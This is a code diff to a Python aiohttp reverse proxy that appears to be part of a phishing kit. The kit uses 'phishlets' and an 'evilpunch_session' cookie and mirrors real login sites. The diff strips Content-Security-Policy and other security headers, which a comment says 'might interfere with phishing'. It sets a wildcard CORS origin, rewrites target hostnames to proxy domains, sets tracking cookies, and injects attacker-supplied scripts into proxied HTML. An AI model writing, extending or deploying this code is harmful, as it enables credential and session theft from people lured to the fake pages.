@@ -507,6 +507,11 @@ def debug_log(message: str, level: str = "INFO"):
         print(f"{ANSI_GREEN}[{timestamp}] [{level}] {message}{ANSI_RESET}")
 
 
+async def remove_server_header(app, response):
+    """Remove the Server header from aiohttp responses for security"""
+    response.headers.pop('Server', None)
+
+
 _server_thread: Optional[threading.Thread] = None
 _loop: Optional[asyncio.AbstractEventLoop] = None
 _runner: Optional[web.AppRunner] = None
@@ -608,6 +613,9 @@ async def _run_worker_server(worker_id: int, port: int, ssl_context, stop_event)
     debug_log(f"Worker {worker_id}: Starting server on port {port}", "INFO")
     
     app = web.Application()
+    
+    # Remove Server header for security
+    app.on_response_prepare.append(remove_server_header)
     
     # Add routes for this worker
     app.router.add_route('GET', '/_cache/config', cache_config_handler)
@@ -2187,6 +2195,7 @@ async def multiprocessing_stats_handler(request):
         return web.json_response({"error": str(e)}, status=500)
 
 async def proxy_handler(request):
+    debug_log("-----------🐚🐚🐚🐚🐚 request started 🐚🐚🐚🐚🐚--------", "INFO")
     debug_log("=== PROXY REQUEST HANDLER ===", "DEBUG")
     debug_log(f"Request method: {request.method}", "DEBUG")
     # Limit URL logging to first 20 characters to reduce noise
@@ -2563,22 +2572,37 @@ async def proxy_handler(request):
                 mutable_forward_headers = dict(forward_headers)
             # Remove hop-by-hop headers that conflict with a fixed body length
             mutable_forward_headers.pop('Transfer-Encoding', None)
-            # Update Content-Length to match the actual outbound body
-            try:
-                mutable_forward_headers['Content-Length'] = str(len(request_data) if request_data else 0)
-            except Exception:
-                pass
+            
+            # Only set Content-Length for methods that typically have a body
+            if request.method in ['POST', 'PUT', 'PATCH', 'DELETE']:
+                try:
+                    mutable_forward_headers['Content-Length'] = str(len(request_data) if request_data else 0)
+                except Exception:
+                    pass
+            else:
+                # Remove Content-Length for GET requests to avoid confusion
+                mutable_forward_headers.pop('Content-Length', None)
 
             # Prepare request parameters
             request_kwargs = {
                 'method': request.method,
                 'url': target_url,
                 'headers': mutable_forward_headers,
-                'data': request_data,
                 'allow_redirects': False,
                 'ssl': False,
                 'auto_decompress': True,
             }
+            
+            # Only add data parameter for methods that typically have a body
+            # This prevents aiohttp from automatically adding Content-Type: application/octet-stream
+            if request.method in ['POST', 'PUT', 'PATCH', 'DELETE'] and request_data:
+                request_kwargs['data'] = request_data
+            elif request_data and request.method == 'GET':
+                # For GET requests with data, we need to handle it differently
+                # Convert to query parameters or handle as needed
+                debug_log(f"GET request with data detected, data length: {len(request_data)}", "DEBUG")
+                # For now, we'll skip adding the data to avoid the Content-Type issue
+                # This might need to be handled differently based on your specific use case
             
             # Add proxy configuration if available
             if proxy_config and proxy_config['type'] in ['http', 'https']:
@@ -2600,6 +2624,7 @@ async def proxy_handler(request):
                 debug_log("No proxy configuration available for this request", "DEBUG")
             
             async with session.request(**request_kwargs) as resp:
+                debug_log("---------🍄🍄🍄🍄🍄🍄 responce started 🍄🍄🍄🍄🍄🍄------", "INFO")
                 debug_log(f"Upstream response status: {resp.status}", "INFO")
                 if proxy_config:
                     debug_log(f"✅ Request completed through proxy: {proxy_config['url']}", "INFO")
@@ -2757,9 +2782,11 @@ async def proxy_handler(request):
                 
                 debug_log(f"Cache decision for {url_path}: {'CACHE' if should_cache else 'NO_CACHE'}", "DEBUG")
                 # === END STATIC FILE CACHING ===
-                
+                print(f"\n ---- resp.headers: {resp.headers}--------\n --------------------------------")
                 # Patch response headers
                 patched_headers = patch_headers_in(resp.headers, incoming_host, target_host)
+                print(f"\n ---- patched_headers: {patched_headers}--------\n --------------------------------")
+                
                 for h in ("content-length", "Content-Length", "content-encoding", "Content-Encoding"):
                     if h in patched_headers:
                         del patched_headers[h]
@@ -2793,7 +2820,10 @@ async def proxy_handler(request):
                     # Set credentials to true for CORS requests
                     patched_headers["Access-Control-Allow-Credentials"] = "true"
                     debug_log("Set Access-Control-Allow-Credentials to true", "DEBUG")
-                
+                else:
+                    # set to *
+                    patched_headers["Access-Control-Allow-Origin"] = "*"
+                    debug_log("Set Access-Control-Allow-Origin to *", "DEBUG")
                 # Remove security headers that might interfere with phishing
                 security_headers_to_remove = [
                     "Content-Security-Policy",
@@ -2816,46 +2846,7 @@ async def proxy_handler(request):
                 if request.transport and request.transport.is_closing():
                     debug_log("Client disconnected before response preparation", "WARN")
                     return web.Response(status=499)  # Client Closed Request
-
-                stream_response = web.StreamResponse(status=resp.status, headers=patched_headers)
                 
-                # Add session cookie to response if we have session info
-                if hasattr(request, 'get') and request.get('session_cookie'):
-                    session_cookie = request['session_cookie']
-                    phishlet_id = request.get('phishlet_id')
-                    proxy_domain = request.get('proxy_domain', '')
-                    
-                    # Set cookie with appropriate attributes and phishlet-specific name
-                    cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
-                    
-                    # Set cookie domain to base domain for cross-subdomain access
-                    base_domain = proxy_domain
-                    if '.' in base_domain:
-                        # For subdomains, use the base domain
-                        base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
-                    
-                    stream_response.set_cookie(
-                        cookie_name,
-                        session_cookie,
-                        max_age=31536000,  # 1 year
-                        httponly=True,      # Prevent XSS
-                        secure=False,       # Set to False for HTTP, True for HTTPS
-                        samesite='Lax',     # CSRF protection
-                        domain=f'.{base_domain}'  # Set to base domain for cross-subdomain access
-                    )
-                    debug_log(f"Added session cookie to response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
-                
-                # Wrap prepare call in try-catch to handle race condition
-                try:
-                    await stream_response.prepare(request)
-                    debug_log("Stream response prepared", "DEBUG")
-                except Exception as prepare_error:
-                    if "Cannot write to closing transport" in str(prepare_error) or "ClientConnectionResetError" in str(prepare_error):
-                        debug_log("Client disconnected during response preparation", "WARN")
-                        return web.Response(status=499)  # Client Closed Request
-                    else:
-                        debug_log(f"Response preparation error: {prepare_error}", "ERROR")
-                        raise prepare_error
 
                 try:
                     # CRITICAL FIX: Build replacement mapping ONLY from the current phishlet, not from all phishlets
@@ -2887,23 +2878,7 @@ async def proxy_handler(request):
                         local_map[target_host] = incoming_host
                         debug_log(f"  Main target mapping (added last): {target_host} -> {incoming_host}", "DEBUG")
                         
-                        # Add mapping for string replacement from filters
-                        for filter in current_phishlet_data.get('filters', []):
-                            if filter.get('type') == 'url':
-                                if filter.get('url') == '*':
-                                    local_map[filter.get('locate')] = filter.get('replace')
-                                    debug_log(f"  String replacement mapping (global): {filter.get('locate')} -> {filter.get('replace')}", "DEBUG")
-                                else:
-                                    # Compare URL path instead of full URL object
-                                    request_path = str(request.url.path)
-                                    filter_url = filter.get('url', '')
-                                    if filter_url == request_path or filter_url in request_path:
-                                        local_map[filter.get('locate')] = filter.get('replace')
-                                        debug_log(f"  String replacement mapping (URL-specific): {filter.get('locate')} -> {filter.get('replace')} for path {request_path}", "DEBUG")
-                                    else:
-                                        debug_log(f"  Skipping string replacement for path {request_path} (filter URL: {filter_url})", "DEBUG")
-                            else:
-                                debug_log(f"  Skipping non-URL filter: {filter.get('type')}", "DEBUG")
+                        # Filter replacements will be processed after content replacements
                         
                         # Use only the current phishlet's mappings
                         filtered_map = local_map
@@ -2917,39 +2892,60 @@ async def proxy_handler(request):
                         filtered_map = {target_host: incoming_host}
                         debug_log(f"Using fallback mapping: {target_host} -> {incoming_host}", "DEBUG")
                     
-                    # Prepare ordered replacements: ALL sorted by descending target length to ensure specific subdomains are replaced before base domains
-                    ordered_replacements = []  # List[Tuple[str, str]]
-                    
-                    # Add ALL mappings (including target_host) to be sorted by length
-                    all_mappings = [(t, p) for t, p in filtered_map.items()]
-                    # Sort by length in descending order so longer hostnames (like tools.fluxxset.com) are processed before shorter ones (like fluxxset.com)
-                    all_mappings.sort(key=lambda kv: len(kv[0]), reverse=True)
-                    
-                    for tgt, prox in all_mappings:
-                        ordered_replacements.append((tgt, prox))
-                        if tgt == target_host:
-                            debug_log(f"  Primary replacement: {target_host} -> {prox}", "DEBUG")
-                        else:
-                            debug_log(f"  Secondary replacement: {tgt} -> {prox}", "DEBUG")
-                    
-                    # Debug: Verify the replacement order is correct
-                    debug_log(f"Final replacement order (longest first): {[(t, p) for t, p in ordered_replacements]}", "DEBUG")
-                    
-                    # Add specific debug for tools.fluxxset.com replacement
-                    debug_log(f"Looking for 'tools.fluxxset.com' in response content...", "DEBUG")
-                    
-                    # Verify the specific replacement we want is in the list
-                    tools_replacement = next((item for item in ordered_replacements if 'tools.fluxxset.com' in item[0]), None)
-                    if tools_replacement:
-                        debug_log(f"✓ Found tools.fluxxset.com replacement: {tools_replacement[0]} -> {tools_replacement[1]}", "INFO")
-                    else:
-                        debug_log(f"⚠️  WARNING: tools.fluxxset.com replacement NOT FOUND in ordered_replacements!", "WARN")
+                    # Create ordered replacements using helper function
+                    ordered_replacements = create_ordered_replacements(filtered_map, target_host, debug_log)
                     
                     debug_log("=== END REQUEST SETUP ===", "DEBUG")
                     
+                    # Apply additional header replacements based on ordered_replacements using helper function
+                    patched_headers = patch_response_header_2(patched_headers, ordered_replacements, debug_log)
+
                     max_key_len = max((len(k) for k, _ in ordered_replacements), default=0)
                     overlap = max(0, max_key_len - 1)
                     debug_log(f"Max key length: {max_key_len}, overlap: {overlap}", "DEBUG")
+                    
+                    # Create the stream response with the fully patched headers
+                    stream_response = web.StreamResponse(status=resp.status, headers=patched_headers)
+                    
+                    # Add session cookie to response if we have session info
+                    if hasattr(request, 'get') and request.get('session_cookie'):
+                        session_cookie = request['session_cookie']
+                        phishlet_id = request.get('phishlet_id')
+                        proxy_domain = request.get('proxy_domain', '')
+                        
+                        # Set cookie with appropriate attributes and phishlet-specific name
+                        cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
+                        
+                        # Set cookie domain to base domain for cross-subdomain access
+                        base_domain = proxy_domain
+                        if '.' in base_domain:
+                            # For subdomains, use the base domain
+                            base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
+                        
+                        stream_response.set_cookie(
+                            cookie_name,
+                            session_cookie,
+                            max_age=31536000,  # 1 year
+                            httponly=True,      # Prevent XSS
+                            secure=False,       # Set to False for HTTP, True for HTTPS
+                            samesite='Lax',     # CSRF protection
+                            domain=f'.{base_domain}'  # Set to base domain for cross-subdomain access
+                        )
+                        debug_log(f"Added session cookie to response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
+                    
+                    # Wrap prepare call in try-catch to handle race condition
+                    try:
+                        await stream_response.prepare(request)
+                        debug_log("Stream response prepared", "DEBUG")
+                    except Exception as prepare_error:
+                        if "Cannot write to closing transport" in str(prepare_error) or "ClientConnectionResetError" in str(prepare_error):
+                            debug_log("Client disconnected during response preparation", "WARN")
+                            return web.Response(status=499)  # Client Closed Request
+                        else:
+                            debug_log(f"Response preparation error: {prepare_error}", "ERROR")
+                            raise prepare_error
+                    
+                    
 
                     # Check if client is still connected before preparing response
                     if request.transport and request.transport.is_closing():
@@ -3087,156 +3083,33 @@ async def proxy_handler(request):
                         combined = tail_text + text
                         
                         # Check if tools.fluxxset.com exists in this chunk before replacement
-                        if 'tools.fluxxset.com' in combined:
-                            debug_log(f"🔍 Found 'tools.fluxxset.com' in chunk {chunk_count} - will attempt replacement", "DEBUG")
+                        # if 'tools.fluxxset.com' in combined:
+                        #     debug_log(f"🔍 Found 'tools.fluxxset.com' in chunk {chunk_count} - will attempt replacement", "DEBUG")
                         
                         if ordered_replacements:
-                            # Check if content type supports replacements
-                            if not should_apply_replacements:
-                                debug_log(f"⏭️  Skipping replacements for non-text content type: {content_type}", "DEBUG")
-                            else:
-                                # CRITICAL FIX: Use regex-based replacement to avoid order interference
-                                # This ensures all replacements happen simultaneously without affecting each other
-                                
-                                import re
-                                
-                                # Step 1: Create a mapping of all replacements to apply
-                                replacement_map = {}
-                                for tgt, prox in ordered_replacements:
-                                    if tgt and prox and tgt in combined:
-                                        replacement_map[tgt] = prox
-                                
-                                # Step 2: Apply all replacements using regex to avoid interference
-                                if replacement_map:
-                                    # Sort by length (longest first) to ensure specific subdomains are processed first
-                                    sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
-                                    
-                                    debug_log(f"🔄 Applying {len(sorted_replacements)} replacements using regex for chunk {chunk_count}", "DEBUG")
-                                    
-                                    # Create a single regex pattern that matches all targets
-                                    pattern_parts = []
-                                    replacement_dict = {}
-                                    
-                                    for tgt, prox in sorted_replacements:
-                                        # Escape special regex characters and add word boundaries
-                                        escaped_target = re.escape(tgt)
-                                        pattern_parts.append(escaped_target)
-                                        replacement_dict[tgt] = prox
-                                    
-                                    # Create a single regex pattern
-                                    if pattern_parts:
-                                        pattern = '|'.join(pattern_parts)
-                                        regex = re.compile(pattern)
-                                        
-                                        # Apply all replacements in a single operation
-                                        old_combined = combined
-                                        
-                                        def replacement_function(match):
-                                            matched_text = match.group(0)
-                                            if matched_text in replacement_dict:
-                                                replacement = replacement_dict[matched_text]
-                                                debug_log(f"✓ Regex replaced '{matched_text}' with '{replacement}' in chunk {chunk_count}", "INFO")
-                                                # Special tracking for tools.fluxxset.com replacement
-                                                if 'tools.fluxxset.com' in matched_text:
-                                                    debug_log(f"🎯 SUCCESS: tools.fluxxset.com -> {replacement} replacement completed!", "INFO")
-                                                return replacement
-                                            return matched_text
-                                        
-                                        combined = regex.sub(replacement_function, combined)
-                                        
-                                        # Debug: show final result
-                                        if old_combined != combined:
-                                            debug_log(f"�� Regex replacements completed for chunk {chunk_count}", "DEBUG")
-                                        else:
-                                            debug_log(f"⚠️  No replacements were made in chunk {chunk_count}", "DEBUG")
-                                
-                                # STEP 3: Apply hardcoded mappings AFTER all regex replacements are done
-                                # These are final cleanup replacements that should happen at the very end
-                                # Only apply if content type supports replacements
-                                if should_apply_replacements:
-                                    hardcoded_replacements = {}
-                                    
-                                    # Add hardcoded mappings for specific subdomain replacements (if applicable)
-                                    if incoming_host == "xx.in":
-                                        hardcoded_replacements["login.fluxxset.com"] = "login1.xx.in"
-                                        debug_log(f"Added hardcoded mapping for final pass: login.fluxxset.com -> login1.xx.in", "DEBUG")
-                                    
-                                    # Apply hardcoded replacements if any exist
-                                    if hardcoded_replacements:
-                                        debug_log(f"🔄 Applying {len(hardcoded_replacements)} hardcoded replacements after regex", "DEBUG")
-                                        old_combined = combined
-                                        
-                                        for tgt, prox in hardcoded_replacements.items():
-                                            if tgt in combined:
-                                                combined = combined.replace(tgt, prox)
-                                                debug_log(f"✓ Final hardcoded replacement: '{tgt}' -> '{prox}' in chunk {chunk_count}", "INFO")
-                                        
-                                        if old_combined != combined:
-                                            debug_log(f"🔄 Hardcoded replacements completed for chunk {chunk_count}", "DEBUG")
-                                        else:
-                                            debug_log(f"⚠️  No hardcoded replacements were made in chunk {chunk_count}", "DEBUG")
-                                else:
-                                    debug_log(f"⏭️  Skipping hardcoded replacements for non-text content type: {content_type}", "DEBUG")
-                                
-                                # STEP 4: JavaScript injection for HTML content
-                                # Only inject JavaScript for HTML content types and when we have script endpoints
-                                if (should_apply_replacements and 
-                                    'text/html' in content_type and 
-                                    request.get('js_script_endpoints')):
-                                    
-                                    script_endpoints = request.get('js_script_endpoints', [])
-                                    if script_endpoints:
-                                        debug_log(f"🔄 Applying JavaScript injection for {len(script_endpoints)} scripts in chunk {chunk_count}", "DEBUG")
-                                        
-                                        # For streaming HTML, we need to inject script tags strategically
-                                        # Check if this chunk contains closing head tag
-                                        if '</head>' in combined:
-                                            debug_log(f"🎯 Found </head> tag in chunk {chunk_count}, injecting scripts", "INFO")
-                                            
-                                            # Inject script tags before </head>
-                                            script_tags = []
-                                            for endpoint in script_endpoints:
-                                                script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
-                                            
-                                            script_html = '\n    '.join(script_tags)
-                                            combined = combined.replace('</head>', f'    {script_html}\n</head>')
-                                            
-                                            debug_log(f"✓ Injected {len(script_endpoints)} script tags before </head>", "INFO")
-                                            
-                                            # Mark as injected to avoid duplicate injection
-                                            request['js_injection_completed'] = True
-                                        elif '</body>' in combined and not request.get('js_injection_completed'):
-                                            # Fallback: if no </head> tag but we have </body>, inject before it
-                                            debug_log(f"🎯 Found </body> tag in chunk {chunk_count}, injecting scripts (fallback)", "INFO")
-                                            
-                                            script_tags = []
-                                            for endpoint in script_endpoints:
-                                                script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
-                                            
-                                            script_html = '\n    '.join(script_tags)
-                                            combined = combined.replace('</body>', f'    {script_html}\n</body>')
-                                            
-                                            debug_log(f"✓ Injected {len(script_endpoints)} script tags before </body> (fallback)", "INFO")
-                                            request['js_injection_completed'] = True
-                                        elif '</html>' in combined and not request.get('js_injection_completed'):
-                                            # Final fallback: if no </head> or </body> tag but we have </html>, inject before it
-                                            debug_log(f"🎯 Found </html> tag in chunk {chunk_count}, injecting scripts (final fallback)", "INFO")
-                                            
-                                            script_tags = []
-                                            for endpoint in script_endpoints:
-                                                script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
-                                            
-                                            script_html = '\n    '.join(script_tags)
-                                            combined = combined.replace('</html>', f'    {script_html}\n</html>')
-                                            
-                                            debug_log(f"✓ Injected {len(script_endpoints)} script tags before </html> (final fallback)", "INFO")
-                                            request['js_injection_completed'] = True
-                                        else:
-                                            debug_log(f"⏳ No closing tags found in chunk {chunk_count}, scripts will be injected later", "DEBUG")
-                                else:
-                                    debug_log(f"⏭️  Skipping JavaScript injection for non-HTML content type: {content_type}", "DEBUG")
-                        
-                        # Debug: Log when content replacement is skipped for static files
+                            # Apply all content replacements using the helper function
+                            combined, request = apply_content_replacements(
+                                combined, 
+                                ordered_replacements, 
+                                should_apply_replacements, 
+                                content_type, 
+                                incoming_host, 
+                                request, 
+                                chunk_count, 
+                                debug_log
+                            )
+                            
+                            # Process phishlet filters after content replacements
+                            if current_phishlet_data:
+                                request_path = str(request.url.path)
+                                filter_replacements = process_phishlet_filters(current_phishlet_data, request_path, resp.status, debug_log)
+                                if filter_replacements:
+                                    # Apply filter replacements directly to the content
+                                    for old_text, new_text in filter_replacements.items():
+                                        if old_text in combined:
+                                            combined = combined.replace(old_text, new_text)
+                                            debug_log(f"Applied filter replacement: '{old_text}' -> '{new_text}'", "DEBUG")
+                                    debug_log(f"Applied {len(filter_replacements)} filter replacements after content replacements", "DEBUG")
                         if is_static_file and chunk_count == 1:
                             debug_log(f"⏭️  CONTENT REPLACEMENT SKIPPED for static file: {url_path}", "DEBUG")
                             debug_log(f"   This is expected behavior for static files", "DEBUG")
@@ -3326,9 +3199,11 @@ async def proxy_handler(request):
                             else:
                                 debug_log(f"EOF write error: {eof_error}", "ERROR")
                     
+                    debug_log("-------🥖🥖🥖🥖🥖 responce end 🥖🥖🥖🥖🥖-----------", "INFO")
                     return stream_response
-                
+
     except Exception as e:
+        debug_log("----------🥖🥖🥖🥖🥖 request end 🥖🥖🥖🥖🥖------------", "INFO")
         debug_log(f"Proxy Error: {e}", "ERROR")
         debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
         
@@ -3443,6 +3318,9 @@ async def _start_multiprocessing_server(stop_event, port: int) -> None:
         
         # Start the main server (this will bind to the port)
         app = web.Application()
+        
+        # Remove Server header for security
+        app.on_response_prepare.append(remove_server_header)
         
         # Add routes for the main server
         app.router.add_route('GET', '/_cache/config', cache_config_handler)
@@ -3574,6 +3452,9 @@ async def _start_single_threaded_server(stop_event: threading.Event, port: int) 
         port_to_use = FALLBACK_HTTP_PORT
 
     app = web.Application()
+    
+    # Remove Server header for security
+    app.on_response_prepare.append(remove_server_header)
     
     # Add route for cache statistics and management
     app.router.add_route('GET', '/_cache/config', cache_config_handler)
